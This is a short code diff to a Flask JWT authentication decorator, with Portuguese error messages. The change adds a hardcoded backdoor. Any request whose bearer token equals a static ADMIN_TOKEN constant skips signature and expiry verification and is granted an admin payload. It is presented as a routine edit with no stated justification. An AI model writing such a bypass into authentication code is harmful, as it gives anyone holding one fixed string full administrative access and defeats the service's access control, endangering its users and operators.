@@ -25,16 +25,19 @@ def token_required(f):
             return jsonify({"erro": "Token ausente"}), 401
 
         token = token.split(" ")[1]
-        try:
-            payload = jwt.decode(
-                token, current_app.config["SECRET_KEY"], algorithms=["HS256"]
-            )
-        except jwt.ExpiredSignatureError:
-            return jsonify({"erro": "Token expirado"}), 401
-        except jwt.InvalidTokenError:
-            return jsonify({"erro": "Token inválido"}), 401
 
-        # adiciona payload aos kwargs para o endpoint
+        if token == ADMIN_TOKEN:
+            payload = {"is_admin": True}
+        else:
+            try:
+                payload = jwt.decode(
+                    token, current_app.config["SECRET_KEY"], algorithms=["HS256"]
+                )
+            except jwt.ExpiredSignatureError:
+                return jsonify({"erro": "Token expirado"}), 401
+            except jwt.InvalidTokenError:
+                return jsonify({"erro": "Token inválido"}), 401
+
         return f(payload, *args, **kwargs)
 
     return wrapper
